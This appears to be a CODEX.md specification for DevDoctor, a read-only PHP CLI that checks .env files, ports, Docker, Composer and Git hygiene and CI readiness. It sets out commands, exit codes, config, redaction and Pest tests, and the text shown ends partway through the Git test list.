# CODEX.md — DevDoctor

## 1. Product goal

Build **DevDoctor**: a public, developer-focused CLI diagnostics tool.

DevDoctor should help developers catch common local, repository, environment, Docker, Composer, Git, and CI problems before they waste time debugging them manually.

This is not a project-specific tool and not a Laravel-only tool.

The product goal:

> Developer diagnostics for humans. One command per problem area. Clear output. Safe defaults. CI-friendly exit codes.

The required public command surface is:

```bash
devdoctor env
devdoctor ports
devdoctor docker
devdoctor composer
devdoctor git
devdoctor ci
```

Every command listed above must be implemented or explicitly stubbed with a clear "not implemented yet" message only during early scaffolding. The final usable version must include all six commands.

Do not reduce the product to only `.env` checks. The `.env` module is important, but it is only one module.

---

## 2. Technical stack

Use:

- PHP 8.5+
- Laravel Zero 12.x
- Pest for tests
- Symfony Console / Laravel Prompts where appropriate
- Composer package distribution
- PHAR build support later

Runtime dependencies should be minimal.

Allowed dependency examples:

- `symfony/yaml` for `devdoctor.yml`
- Symfony Process if needed for safe command execution
- Symfony Finder if needed for file discovery

Avoid unnecessary dependencies for simple parsing, process listing, or filesystem checks.

---

## 3. Product positioning

DevDoctor must work for common developer projects:

- PHP
- Laravel
- Symfony
- Node / Next.js / Vite
- Docker Compose projects
- generic Git repositories
- generic `.env` based projects

Laravel-specific behavior is allowed as a preset later, but the baseline must remain framework-agnostic.

---

## 4. Required command overview

### 4.1 `devdoctor env`

Checks `.env`, `.env.example`, and optional `devdoctor.yml` rules.

Primary use:

```bash
devdoctor env
```

Purpose:

- catch missing environment variables
- detect drift between `.env` and `.env.example`
- detect likely leaked secrets in committed template files
- detect dangerous production config
- validate configured value types

### 4.2 `devdoctor ports`

Checks local port usage and common development port conflicts.

Primary use:

```bash
devdoctor ports
devdoctor ports --port=8000
```

Purpose:

- show what process owns a port
- detect conflicts for common dev ports
- suggest safe kill commands without executing them by default
- help diagnose "port already in use" issues

### 4.3 `devdoctor docker`

Checks Docker / Docker Compose project health.

Primary use:

```bash
devdoctor docker
```

Purpose:

- verify Docker availability
- verify Docker daemon status
- validate Compose config when compose files exist
- detect missing Compose environment variables
- detect port conflicts declared by Compose
- report unhealthy containers when available

### 4.4 `devdoctor composer`

Checks PHP Composer project health.

Primary use:

```bash
devdoctor composer
```

Purpose:

- validate `composer.json`
- check `composer.lock` drift
- detect PHP version/platform mismatches
- report abandoned packages from installed metadata when available
- run safe Composer diagnostic commands when Composer exists

### 4.5 `devdoctor git`

Checks Git repository hygiene and common safety problems.

Primary use:

```bash
devdoctor git
```

Purpose:

- detect dirty working tree
- show branch and upstream state
- detect untracked sensitive files
- detect tracked `.env`-like files
- detect missing remote/upstream
- detect large untracked files that may be accidentally committed

### 4.6 `devdoctor ci`

Aggregates selected diagnostics for CI.

Primary use:

```bash
devdoctor ci
```

Purpose:

- run CI-safe checks across modules
- produce deterministic output
- return strict exit codes
- support JSON output for machines
- avoid interactive prompts

Default CI modules:

```text
env
composer
git
docker
```

`ports` is not run by default in CI unless explicitly requested, because CI runners often have unrelated port usage.

---

## 5. Global UX rules

DevDoctor must feel safe.

Global rules:

- Read-only by default.
- Never modify `.env` automatically.
- Never print raw secrets.
- Never send telemetry.
- Never call external APIs by default.
- Never require internet access for the basic command.
- Avoid destructive operations.
- If a destructive operation is later added, require an explicit flag and confirmation.
- All commands must support `--format=table|json`.
- All commands must support `--ci`.
- JSON output must contain no ANSI colors and no decorative text.

Global options every command should support where practical:

```bash
--path=.
--format=table|json
--ci
--strict
--no-interaction
--verbose
```

If an option is not meaningful for a command, do not implement fake behavior. But `--path`, `--format`, and `--ci` should be consistent across all six public commands.

---

## 6. Exit codes

Use deterministic exit codes.

```text
0 = no issues
1 = warnings only
2 = errors found
3 = invalid DevDoctor config
4 = required input / dependency missing
5 = internal error / unexpected exception
```

Rules:

- In `--ci` mode, warnings exit with `1`.
- Errors exit with `2`.
- Invalid config exits with `3`.
- Missing required files/tools exit with `4` only when the command cannot meaningfully continue.
- Unexpected exceptions exit with `5`.
- `devdoctor ci` returns the highest-severity exit code from included modules.

---

## 7. Severity model

Every finding must be represented as an `Issue` object.

Required fields:

```php
final readonly class Issue
{
    public function __construct(
        public string $code,
        public string $severity, // error|warning|info
        public string $message,
        public ?string $module = null,
        public ?string $file = null,
        public ?int $line = null,
        public ?string $key = null,
        public array $context = [],
    ) {}
}
```

Severity definitions:

- `error`: likely to break runtime, CI, or production safety
- `warning`: suspicious, inconsistent, risky, or likely to waste developer time
- `info`: useful note, not a failure

Do not print raw secret values in `message` or `context`.

---

## 8. Shared architecture

Command classes must stay thin.

Command classes should only:

1. read CLI options
2. create module input objects
3. call analyzer/service classes
4. render output
5. return exit code

Suggested structure:

```text
app/
  Commands/
    EnvCommand.php
    PortsCommand.php
    DockerCommand.php
    ComposerCommand.php
    GitCommand.php
    CiCommand.php

  DevDoctor/
    Core/
      Issue.php
      IssueCollection.php
      Severity.php
      ExitCode.php
      ModuleResult.php
      ModuleRunner.php
      PathResolver.php
      Redactor.php
      ProcessRunner.php
      CommandAvailability.php
      Platform.php
      Config/
        DevDoctorConfig.php
        ConfigLoader.php
        ConfigValidator.php
      Output/
        TableRenderer.php
        JsonRenderer.php
        SummaryRenderer.php

    Modules/
      Env/
        EnvAnalyzer.php
        EnvOptions.php
        EnvFile.php
        EnvEntry.php
        EnvParser.php
        EnvInventory.php
        EnvComparator.php
        SecretScanner.php
        ValueValidator.php
        Rules/

      Ports/
        PortsAnalyzer.php
        PortsOptions.php
        PortProbe.php
        PortUsage.php
        ProcessInfo.php
        CommonPorts.php
        PlatformPortProviderInterface.php
        MacOsPortProvider.php
        LinuxPortProvider.php
        WindowsPortProvider.php

      Docker/
        DockerAnalyzer.php
        DockerOptions.php
        DockerAvailability.php
        DockerComposeFileDetector.php
        DockerComposeParser.php
        DockerComposeConfigRunner.php
        DockerContainerInspector.php
        ComposeEnvReferenceScanner.php
        ComposePortConflictDetector.php

      Composer/
        ComposerAnalyzer.php
        ComposerOptions.php
        ComposerJsonReader.php
        ComposerLockReader.php
        ComposerCommandRunner.php
        PlatformRequirementChecker.php
        ComposerScriptInspector.php

      Git/
        GitAnalyzer.php
        GitOptions.php
        GitCommandRunner.php
        GitStatusParser.php
        GitRemoteInspector.php
        SensitiveFileScanner.php
        LargeFileScanner.php

      Ci/
        CiAnalyzer.php
        CiOptions.php
        CiModuleSelector.php
        CiResultMerger.php
```

---

## 9. Config file: `devdoctor.yml`

Support one config file for all modules.

Default path:

```text
devdoctor.yml
```

Example:

```yaml
version: 1

defaults:
  format: table
  strict: false

modules:
  env:
    enabled: true
    files:
      env: .env
      example: .env.example
    scan_secret_files:
      - .env.example
      - .env.dist
      - .env.sample
    rules:
      APP_ENV:
        required: true
        allowed: [local, development, staging, production]
      APP_DEBUG:
        type: bool
        forbidden_when:
          APP_ENV: production
      DATABASE_URL:
        required: true
        type: url
      MAIL_HOST:
        required_when:
          MAIL_MAILER: smtp
      STRIPE_SECRET:
        secret: true
        required_when:
          PAYMENTS_ENABLED: true
    ignore:
      missing_in_env:
        - OPTIONAL_FEATURE_FLAG
      missing_in_example:
        - LOCAL_ONLY_SECRET

  ports:
    enabled: true
    common_ports:
      - 80
      - 443
      - 3000
      - 5173
      - 8000
      - 8080
      - 5432
      - 3306
      - 6379
    ignore_ports:
      - 5353

  docker:
    enabled: true
    compose_files:
      - docker-compose.yml
      - compose.yml
    check_daemon: true
    check_compose_config: true
    check_unhealthy_containers: true

  composer:
    enabled: true
    check_validate: true
    check_lock: true
    check_platform: true
    check_scripts: true

  git:
    enabled: true
    require_clean_worktree: false
    require_upstream: false
    warn_on_tracked_env_files: true
    sensitive_file_patterns:
      - ".env"
      - ".env.*"
      - "*.pem"
      - "*.key"
      - "id_rsa"
      - "id_ed25519"

  ci:
    modules:
      - env
      - composer
      - git
      - docker
    fail_on_warnings: true
```

Config validation:

- invalid YAML exits `3`
- unknown top-level keys should be warnings, not fatal
- invalid module config should be an error in that module
- CLI options override config file values

---

## 10. Output contract

Default table output should be readable and screenshot-friendly.

Example:

```text
DevDoctor

Module    Status    Errors    Warnings    Info
env       failed    2         4           0
docker    passed    0         0           1
composer  warning   0         2           0
git       passed    0         0           0

Errors
  [DD_ENV_PROD_DEBUG] .env:4 APP_DEBUG=true while APP_ENV=production
  [DD_ENV_DUPLICATE_KEY] .env:12 APP_ENV is defined more than once

Warnings
  [DD_COMPOSER_LOCK_OUTDATED] composer.lock is not in sync with composer.json
  [DD_GIT_UNTRACKED_SECRET] .env.local looks sensitive and is untracked
```

### JSON output

When `--format=json` is passed, output valid JSON only.

Shape:

```json
{
  "tool": "devdoctor",
  "status": "failed",
  "summary": {
    "errors": 2,
    "warnings": 4,
    "info": 1
  },
  "modules": [
    {
      "name": "env",
      "status": "failed",
      "summary": {
        "errors": 2,
        "warnings": 4,
        "info": 0
      },
      "issues": []
    }
  ]
}
```

No ANSI colors in JSON output.

---

# MODULE SPECIFICATIONS

---

## 11. `devdoctor env`

### 11.1 Purpose

`devdoctor env` diagnoses dotenv-style configuration.

It must work without booting any framework.

### 11.2 Command

```bash
devdoctor env
```

Options:

```bash
--path=.
--env=.env
--example=.env.example
--config=devdoctor.yml
--format=table|json
--ci
--strict
--no-secrets
```

### 11.3 Required checks

#### File existence

Check:

- `.env` exists
- `.env.example` exists

Default severity:

- missing `.env`: `error`
- missing `.env.example`: `warning`

If `.env.example` is missing, still analyze `.env` where possible.

#### Key diff

Detect:

- keys in `.env` missing from `.env.example`
- keys in `.env.example` missing from `.env`

Default severity:

- missing from `.env`: `warning`
- missing from `.env.example`: `warning`

If `--strict` is passed, both become `error`.

#### Duplicate keys

Detect duplicate variable names within the same file.

Example:

```dotenv
APP_ENV=local
APP_ENV=production
```

Severity: `error`.

#### Invalid key names

Valid key pattern:

```regex
^[A-Z_][A-Z0-9_]*$
```

Invalid examples:

```dotenv
app_env=local
1PASSWORD_SECRET=abc
APP-ENV=local
```

Severity: `warning`.

Do not fail hard for lowercase keys in the first version because some ecosystems use lowercase env names.

#### Empty values

Detect:

```dotenv
DATABASE_URL=
MAIL_HOST=
```

Default severity: `warning`.

If the key is marked `required: true`, severity: `error`.

#### Suspicious production config

Detect:

```dotenv
APP_ENV=production
APP_DEBUG=true
```

and:

```dotenv
NODE_ENV=production
DEBUG=true
```

Severity: `error`.

#### Secret leakage in example files

Scan files intended to be committed:

- `.env.example`
- `.env.dist`
- `.env.sample`

Suspicious key names:

```text
SECRET
TOKEN
PRIVATE_KEY
ACCESS_KEY
API_KEY
PASSWORD
PASS
CREDENTIAL
AUTH
WEBHOOK_SECRET
CLIENT_SECRET
```

Value is suspicious if:

- length >= 20 and not a placeholder
- resembles a common secret prefix
- looks like a JWT
- looks like a private key block
- contains high-entropy token-like characters

Allowed placeholder examples:

```text
changeme
change_me
example
example-secret
dummy
null
false
true
your-key-here
<secret>
xxx
xxxx
****
```

Never print the full secret value. Use redaction.

#### Type validation

Supported configured types:

```text
string
bool
int
url
email
```

Recognized booleans:

```text
true
false
1
0
yes
no
on
off
```

URL validation should be used when configured explicitly and heuristically for keys ending with:

```text
_URL
_URI
ENDPOINT
```

Malformed heuristic URLs are warnings. Configured URL violations are errors.

#### Allowed values

If configured:

```yaml
APP_ENV:
  allowed: [local, staging, production]
```

then any other value is an error.

#### Conditional requirements

Support:

```yaml
MAIL_HOST:
  required_when:
    MAIL_MAILER: smtp
```

Support:

```yaml
APP_DEBUG:
  forbidden_when:
    APP_ENV: production
```

### 11.4 Parser requirements

Support common dotenv syntax:

```dotenv
APP_NAME=Demo
APP_NAME="Demo App"
APP_NAME='Demo App'
APP_DEBUG=true
EMPTY=
SPACED = value
export APP_ENV=local
# comment
```

Each parsed entry must keep:

- key
- value
- raw line
- line number
- file path
- whether value was quoted
- whether entry came from `export KEY=value`

Ignore:

- empty lines
- comment-only lines

Do not implement full variable interpolation in the first version.

### 11.5 Env issue codes

Use stable codes:

```text
DD_ENV_FILE_MISSING
DD_ENV_DUPLICATE_KEY
DD_ENV_INVALID_KEY_NAME
DD_ENV_MISSING_IN_ENV
DD_ENV_MISSING_IN_EXAMPLE
DD_ENV_EMPTY_VALUE
DD_ENV_SECRET_IN_EXAMPLE
DD_ENV_PROD_DEBUG
DD_ENV_INVALID_TYPE
DD_ENV_INVALID_ALLOWED_VALUE
DD_ENV_REQUIRED_MISSING
DD_ENV_REQUIRED_WHEN_MISSING
DD_ENV_FORBIDDEN_WHEN_PRESENT
DD_ENV_INVALID_CONFIG
```

### 11.6 Example output

```text
DevDoctor Env

Files
  ✓ .env
  ✓ .env.example
  ✓ devdoctor.yml

Summary
  Errors:   2
  Warnings: 4
  Info:     0

Errors
  [DD_ENV_DUPLICATE_KEY] .env:12 APP_ENV is defined more than once
  [DD_ENV_PROD_DEBUG]   .env:4  APP_DEBUG=true while APP_ENV=production

Warnings
  [DD_ENV_MISSING_EXAMPLE] STRIPE_SECRET exists in .env but is missing in .env.example
  [DD_ENV_EMPTY_VALUE]     .env:18 MAIL_HOST is empty

Result: failed
```

---

## 12. `devdoctor ports`

### 12.1 Purpose

`devdoctor ports` diagnoses local port usage.

It must answer:

- what is using this port?
- which common dev ports are already occupied?
- is a Docker Compose port mapping conflicting with a local process?
- what command can the user run if they decide to kill the process?

The command must not kill processes by default.

### 12.2 Command

```bash
devdoctor ports
devdoctor ports --port=8000
devdoctor ports --common
```

Options:

```bash
--path=.
--port=8000
--ports=3000,5173,8000
--common
--format=table|json
--ci
--strict
--include-docker
```

First version behavior:

- If `--port` is provided, inspect only that port.
- If `--ports` is provided, inspect that list.
- If neither is provided, inspect configured common ports.
- `--common` forces built-in common ports even if config exists.
- `--include-docker` attempts to correlate Docker containers with port usage when Docker is available.

### 12.3 Common ports

Default common ports:

```text
80      HTTP
443     HTTPS
3000    React / Next.js / Node
3001    alternate Node
4200    Angular
5173    Vite
5174    Vite alternate
8000    PHP / Laravel / Django
8080    generic web
9000    PHP-FPM / Xdebug-related
5432    PostgreSQL
3306    MySQL / MariaDB
6379    Redis
27017   MongoDB
```

### 12.4 Platform behavior

Support:

- macOS
- Linux
- Windows where practical

Implementation strategy:

- Prefer platform-specific command wrappers.
- Keep process command execution isolated in providers.
- Use `ProcessRunner`.
- Parse output into normalized `PortUsage` DTOs.

Potential provider commands:

macOS/Linux:

```bash
lsof -nP -iTCP:<port> -sTCP:LISTEN
```

Linux alternative:

```bash
ss -ltnp
```

Windows:

```powershell
Get-NetTCPConnection -LocalPort <port>
```

and process lookup through:

```powershell
Get-Process -Id <pid>
```

Do not assume all commands exist. Report missing tooling clearly.

### 12.5 Required checks

#### Port in use

If requested port is in use:

- severity: `warning`
- message: `Port 8000 is used by php (PID 12345)`

If `--strict`, severity: `error`.

#### Port free

No issue. Print info summary in table output.

#### Multiple listeners

If multiple processes appear to bind related interfaces for the same port, report all.

#### Privileged port warning

If port is below `1024`, report info/warning that elevated permissions may be required to bind it.

#### Docker port correlation

When `--include-docker` is used and Docker is available:

- detect if the process is likely Docker
- show container name when available
- do not fail if Docker is unavailable

### 12.6 Suggested fix output

For occupied ports, show safe suggestions:

```text
Suggested:
  kill -TERM 12345
```

Do not run the command.

Do not suggest `kill -9` as the first option.

### 12.7 Ports issue codes

```text
DD_PORT_IN_USE
DD_PORT_MULTIPLE_LISTENERS
DD_PORT_PRIVILEGED
DD_PORT_PROVIDER_UNAVAILABLE
DD_PORT_DOCKER_LOOKUP_FAILED
DD_PORT_INVALID_PORT
```

### 12.8 Example output

```text
DevDoctor Ports

Checked ports: 3000, 5173, 8000, 5432, 6379

Warnings
  [DD_PORT_IN_USE] 3000 is used by node (PID 8123)
  [DD_PORT_IN_USE] 5432 is used by postgres (PID 441)

Free
  5173
  8000
  6379

Suggestions
  kill -TERM 8123
  kill -TERM 441

Result: warnings
```

---

## 13. `devdoctor docker`

### 13.1 Purpose

`devdoctor docker` diagnoses Docker and Docker Compose project health.

It must handle three states cleanly:

1. Docker is installed and running.
2. Docker is installed but daemon is unavailable.
3. Docker is not installed.

It should not require Docker for projects that do not use Docker.

### 13.2 Command

```bash
devdoctor docker
```

Options:

```bash
--path=.
--compose-file=docker-compose.yml
--compose-file=compose.yml
--format=table|json
--ci
--strict
--no-daemon
--no-containers
```

### 13.3 Required checks

#### Docker command availability

Check whether `docker` exists.

If Docker files exist and Docker is missing:

- severity: `warning`
- in `--strict`: `error`

If no Docker files exist:

- emit info: `No Docker Compose files detected`
- exit `0`

#### Docker daemon status

When Docker exists and `--no-daemon` is not passed:

```bash
docker info
```

If daemon is unavailable:

- severity: `warning`
- in `--strict`: `error`

#### Compose file detection

Detect:

```text
docker-compose.yml
docker-compose.yaml
compose.yml
compose.yaml
```

Support explicit `--compose-file`.

#### Compose config validation

When Docker is available, run:

```bash
docker compose -f <file> config
```

Capture validation errors.

If command fails:

- severity: `error`
- code: `DD_DOCKER_COMPOSE_INVALID`

#### Missing Compose env references

Detect `${VARIABLE}` references in Compose files.

Compare against:

- `.env` in project root
- process environment
- default values in Compose expression, e.g. `${PORT:-8000}`

Report missing variables as warnings or errors under `--strict`.

Examples:

```yaml
ports:
  - "${APP_PORT}:80"
environment:
  DB_PASSWORD: "${DB_PASSWORD}"
```

#### Compose port conflicts

Extract host ports from Compose config where possible.

Examples:

```yaml
ports:
  - "8080:80"
  - "127.0.0.1:5433:5432"
```

Check whether host ports are already in use by non-Docker processes.

Severity:

- warning by default
- error in `--strict`

#### Unhealthy containers

If Docker daemon is available and `--no-containers` is not passed:

```bash
docker ps --format json
```

or equivalent.

Detect containers with health status:

```text
unhealthy
starting for too long
exited
restarting
```

Be tolerant of Docker versions that do not support JSON output for `docker ps`.

#### Orphan-like project containers

Optional for first version:

- detect containers from the same compose project that are exited or stale
- report as info/warning

### 13.4 Docker issue codes

```text
DD_DOCKER_NOT_DETECTED
DD_DOCKER_DAEMON_UNAVAILABLE
DD_DOCKER_NO_COMPOSE_FILES
DD_DOCKER_COMPOSE_INVALID
DD_DOCKER_COMPOSE_ENV_MISSING
DD_DOCKER_COMPOSE_PORT_CONFLICT
DD_DOCKER_CONTAINER_UNHEALTHY
DD_DOCKER_CONTAINER_RESTARTING
DD_DOCKER_COMMAND_FAILED
```

### 13.5 Example output

```text
DevDoctor Docker

Files
  ✓ docker-compose.yml

Docker
  ✓ docker command found
  ✓ daemon reachable
  ✓ compose config valid

Warnings
  [DD_DOCKER_COMPOSE_ENV_MISSING] docker-compose.yml DB_PASSWORD is referenced but not defined
  [DD_DOCKER_COMPOSE_PORT_CONFLICT] Host port 5432 is already used by postgres (PID 441)

Result: warnings
```

---

## 14. `devdoctor composer`

### 14.1 Purpose

`devdoctor composer` diagnoses Composer project health.

It should not install or update dependencies.

It must be read-only.

### 14.2 Command

```bash
devdoctor composer
```

Options:

```bash
--path=.
--format=table|json
--ci
--strict
--no-scripts
--no-platform-check
--no-validate
```

### 14.3 Required checks

#### Composer project detection

If no `composer.json` exists:

- emit info: `No composer.json detected`
- exit `0`

#### `composer.json` validity

Validate JSON parse.

If invalid JSON:

- severity: `error`
- code: `DD_COMPOSER_JSON_INVALID`

Run when Composer is available:

```bash
composer validate --no-check-publish
```

If Composer is unavailable, still do local JSON checks and report Composer binary missing as warning.

#### `composer.lock` drift

If `composer.lock` is missing but dependencies exist:

- warning

If Composer is available, detect lock drift using:

```bash
composer validate
```

or local hash where practical.

#### Platform requirements

When Composer is available and `vendor` exists:

```bash
composer check-platform-reqs
```

Report failures.

If `vendor` does not exist:

- warning in normal mode
- warning/error in strict based on config

#### PHP version constraint

Parse `require.php` from `composer.json`.

Compare with current PHP version.

If current PHP does not satisfy declared constraint, report error.

Do not implement a full semver solver manually if Composer APIs are available. Prefer Composer semver components if already available through Composer dependencies; otherwise perform basic checks and mark advanced support later.

#### Missing required PHP extensions

Parse `ext-*` requirements and compare with `extension_loaded()`.

Missing required extension:

- error

#### Abandoned packages

If `vendor/composer/installed.json` contains abandoned package metadata, report warning.

Do not call Packagist by default.

#### Scripts inspection

Read `scripts` from `composer.json`.

Warn when dangerous-looking scripts exist under install/update events.

Examples:

```text
post-install-cmd
post-update-cmd
```

Do not call them.

#### Composer audit

Do not require internet. In first version, `composer audit` may be optional and only run if explicitly enabled later.

### 14.4 Composer issue codes

```text
DD_COMPOSER_NOT_PROJECT
DD_COMPOSER_BINARY_MISSING
DD_COMPOSER_JSON_INVALID
DD_COMPOSER_VALIDATE_FAILED
DD_COMPOSER_LOCK_MISSING
DD_COMPOSER_LOCK_OUTDATED
DD_COMPOSER_VENDOR_MISSING
DD_COMPOSER_PLATFORM_REQ_FAILED
DD_COMPOSER_PHP_VERSION_MISMATCH
DD_COMPOSER_EXTENSION_MISSING
DD_COMPOSER_PACKAGE_ABANDONED
DD_COMPOSER_SCRIPT_RISKY
DD_COMPOSER_COMMAND_FAILED
```

### 14.5 Example output

```text
DevDoctor Composer

Files
  ✓ composer.json
  ✓ composer.lock
  ✓ vendor/

Warnings
  [DD_COMPOSER_PACKAGE_ABANDONED] vendor/package is marked as abandoned
  [DD_COMPOSER_SCRIPT_RISKY] post-update-cmd contains shell execution

Errors
  [DD_COMPOSER_EXTENSION_MISSING] Required extension ext-intl is not loaded

Result: failed
```

---

## 15. `devdoctor git`

### 15.1 Purpose

`devdoctor git` diagnoses repository hygiene and safety.

It should work only inside Git repositories.

It must not modify the repository.

### 15.2 Command

```bash
devdoctor git
```

Options:

```bash
--path=.
--format=table|json
--ci
--strict
--require-clean
--require-upstream
--scan-sensitive
--scan-large-files
--large-file-threshold=10M
```

### 15.3 Required checks

#### Git repository detection

Run:

```bash
git rev-parse --show-toplevel
```

If not a Git repository:

- info or warning depending on strict mode
- exit `0` unless `--strict`

#### Working tree status

Run:

```bash
git status --porcelain=v1
```

Detect:

- modified files
- staged files
- untracked files
- deleted files
- conflicted files

Default:

- dirty tree is info/warning
- `--require-clean` makes dirty tree an error
- `devdoctor ci` should usually treat dirty tree as warning unless configured

#### Branch and upstream

Detect:

```bash
git branch --show-current
git rev-parse --abbrev-ref --symbolic-full-name @{u}
git rev-list --left-right --count HEAD...@{u}
```

Report:

- no branch / detached HEAD
- no upstream
- ahead commits
- behind commits

Default severity:

- detached HEAD: warning
- no upstream: warning if `--require-upstream`, info otherwise
- behind remote: warning
- ahead remote: info/warning depending on CI mode

#### Sensitive tracked files

Detect tracked files matching patterns:

```text
.env
.env.*
*.pem
*.key
id_rsa
id_ed25519
*.p12
*.pfx
```

But avoid false positives for safe examples:

```text
.env.example
.env.sample
.env.dist
```

Tracked sensitive file:

- error

Untracked sensitive file:

- warning, because it may be accidentally committed

#### `.gitignore` sanity

If `.env` exists and `.gitignore` does not ignore it, warning.

#### Large untracked files

If enabled, detect untracked files larger than threshold.

Default threshold:

```text
10M
```

Severity:

- info/warning

#### Merge conflicts

Any conflicted status:

- error

### 15.4 Git issue codes

```text
DD_GIT_NOT_REPOSITORY
DD_GIT_COMMAND_MISSING
DD_GIT_DIRTY_WORKTREE
DD_GIT_CONFLICTS
DD_GIT_DETACHED_HEAD
DD_GIT_NO_UPSTREAM
DD_GIT_AHEAD_REMOTE
DD_GIT_BEHIND_REMOTE
DD_GIT_TRACKED_SECRET
DD_GIT_UNTRACKED_SECRET
DD_GIT_ENV_NOT_IGNORED
DD_GIT_LARGE_UNTRACKED_FILE
DD_GIT_COMMAND_FAILED
```

### 15.5 Example output

```text
DevDoctor Git

Repository
  ✓ /Users/me/project
  Branch: main
  Upstream: origin/main

Warnings
  [DD_GIT_BEHIND_REMOTE] main is behind origin/main by 2 commits
  [DD_GIT_UNTRACKED_SECRET] .env.local looks sensitive and is untracked
  [DD_GIT_ENV_NOT_IGNORED] .env exists but is not ignored by .gitignore

Errors
  [DD_GIT_TRACKED_SECRET] .env is tracked by Git

Result: failed
```

---

## 16. `devdoctor ci`

### 16.1 Purpose

`devdoctor ci` runs a curated set of diagnostics suitable for CI/CD.

It must be deterministic, non-interactive, and machine-friendly.

It should not perform slow or highly environment-specific checks unless explicitly requested.

### 16.2 Command

```bash
devdoctor ci
```

Options:

```bash
--path=.
--modules=env,composer,git,docker
--exclude=ports
--format=table|json
--strict
--fail-on-warnings
--no-fail-on-warnings
--config=devdoctor.yml
```

`--ci` is implied for this command.

### 16.3 Default behavior

Default modules:

```text
env
composer
git
docker
```

Default excluded module:

```text
ports
```

Reason:

- port usage on CI runners is often noisy and unrelated to project readiness

Docker behavior in CI:

- If Compose files exist, validate Compose config when Docker is available.
- If Docker is unavailable, report warning rather than failing unless strict.
- Do not inspect local containers by default unless configured.

Git behavior in CI:

- Do not fail simply because the checkout is detached.
- Do fail for tracked secrets.
- Do warn for missing upstream only if configured.

Composer behavior in CI:

- validate composer files
- check platform requirements when possible
- do not run install/update
- do not call internet-dependent checks by default

Env behavior in CI:

- run strict `.env` diagnostics if configured
- JSON output must be stable

### 16.4 Module selection

Examples:

```bash
devdoctor ci --modules=env,composer
devdoctor ci --modules=env,composer,docker,git,ports
devdoctor ci --exclude=docker
```

Rules:

- unknown module name is an error
- duplicate module names are ignored
- `--modules` is applied before `--exclude`

### 16.5 Aggregated result

`devdoctor ci` must return the highest-severity exit code from selected modules.

If `--fail-on-warnings` is true:

- warnings produce exit `1`

If `--no-fail-on-warnings` is true:

- warnings do not fail CI and exit `0` unless errors exist

Default:

- use `devdoctor.yml` setting
- if absent, fail on warnings

### 16.6 CI issue codes

```text
DD_CI_UNKNOWN_MODULE
DD_CI_MODULE_FAILED
DD_CI_INVALID_CONFIG
DD_CI_NO_MODULES_SELECTED
```

### 16.7 Example output

```text
DevDoctor CI

Modules
  env       failed    errors=1 warnings=2
  composer  passed    errors=0 warnings=0
  git       warning   errors=0 warnings=1
  docker    skipped   no compose files detected

Errors
  [DD_ENV_PROD_DEBUG] .env:4 APP_DEBUG=true while APP_ENV=production

Warnings
  [DD_GIT_UNTRACKED_SECRET] .env.local looks sensitive and is untracked

Result: failed
Exit code: 2
```

---

# IMPLEMENTATION DETAILS

---

## 17. Redaction

Implement one central redaction helper and use it everywhere.

Example:

```text
stripe_live_example_token_abcdefghijklmnopqrstuvwxyz123456
```

Should become something like:

```text
stripe_live_example_token_************3456
```

For short sensitive values, fully mask:

```text
********
```

Never let raw sensitive values appear in:

- table output
- JSON output
- exception messages
- logs
- tests snapshots

---

## 18. Sorting

Sort issues by:

1. severity: error, warning, info
2. module
3. file
4. line number
5. code
6. key

---

## 19. Paths

Normalize displayed paths relative to `--path` where possible.

Do not print huge absolute paths unless necessary.

---

## 20. Process execution

All external commands must go through a shared `ProcessRunner`.

Requirements:

- capture stdout
- capture stderr
- capture exit code
- support timeout
- support working directory
- avoid shell injection
- pass arguments as arrays, not concatenated strings
- never execute user-provided shell snippets directly

Default timeout:

```text
10 seconds
```

Allow longer timeouts only for known safe commands.

---

## 21. Platform support

Primary target:

- macOS
- Linux

Secondary target:

- Windows

Windows support can be partial in first version, but commands must fail gracefully with clear issues instead of fatal errors.

---

## 22. README requirements

Create/update `README.md` with:

- project name and one-liner
- installation
- command overview
- examples for each required command:
  - `devdoctor env`
  - `devdoctor ports`
  - `devdoctor docker`
  - `devdoctor composer`
  - `devdoctor git`
  - `devdoctor ci`
- sample output
- JSON output example
- CI example
- `devdoctor.yml` example
- exit codes
- safety guarantees
- roadmap

Suggested intro:

```md
# DevDoctor

Developer diagnostics for humans.

DevDoctor checks your environment, ports, Docker setup, Composer project, Git repository, and CI readiness before small mistakes turn into wasted debugging time.
```

---

## 23. Composer package assumptions

The final package should eventually support:

```bash
composer global require devdoctor/devdoctor
```

Local development should support:

```bash
composer install
php devdoctor env
php devdoctor ports
php devdoctor docker
php devdoctor composer
php devdoctor git
php devdoctor ci
./vendor/bin/pest
```

If the generated Laravel Zero binary has a different filename, rename/configure it to:

```text
devdoctor
```

---

## 24. PHAR distribution

Do not block functional implementation on release automation.

Later target:

```bash
php devdoctor app:build devdoctor
./builds/devdoctor env
```

PHAR build is release infrastructure, not product logic.

---

## 25. Testing requirements

Use Pest.

Tests must cover services directly plus command-level integration tests.

### 25.1 Core tests

- issue creation
- issue collection summary
- exit code mapping
- JSON rendering
- table rendering smoke tests
- redaction
- path normalization
- process runner success/failure/timeout

### 25.2 Env tests

Parser:

- parses simple key/value
- parses quoted values
- parses empty values
- ignores comments
- handles `export KEY=value`
- records correct line numbers
- detects duplicate keys

Analyzer:

- detects keys missing in `.env`
- detects keys missing in `.env.example`
- respects ignore config
- detects production debug
- detects invalid key names
- detects empty required values
- detects realistic long secret
- ignores placeholders
- detects JWT-like value
- redacts values in output
- validates bool/int/url/email
- validates allowed values
- validates `required_when`
- validates `forbidden_when`

Command:

- `devdoctor env` exits `0` when clean
- exits `1` when warnings only
- exits `2` when errors exist
- `--format=json` prints valid JSON
- `--ci` output is deterministic

### 25.3 Ports tests

Use provider fakes instead of depending on local machine state.

- free port produces no issue
- occupied port produces `DD_PORT_IN_USE`
- invalid port produces `DD_PORT_INVALID_PORT`
- privileged port produces warning/info
- provider unavailable produces clear issue
- multiple listeners are reported
- JSON output is valid

### 25.4 Docker tests

Do not require real Docker in unit tests.

Use fake process runner.

- no compose files exits cleanly with info
- docker missing with compose file reports warning
- daemon unavailable reports warning/error based on strict
- invalid compose config reports error
- missing Compose env reference detected
- Compose default env expression does not warn
- host port conflict detected through fake ports module
- unhealthy container detected from fake Docker output

### 25.5 Composer tests

Use fixture `composer.json`, `composer.lock`, and fake process runner.

- no composer.json exits cleanly
- invalid composer.json is error
- missing composer.lock warning when dependencies exist
- missing required extension is error
- PHP version mismatch is error
- abandoned package metadata is warning
- risky script warning
- Composer binary missing is warning, not fatal where local checks can continue

### 25.6 Git tests

Use fake Git command runner for most tests.

- not a repository handled gracefully
- dirty worktree detected
- conflicted files are errors
- detached HEAD warning
- no upstream warning/configurable
- ahead/behind parsed
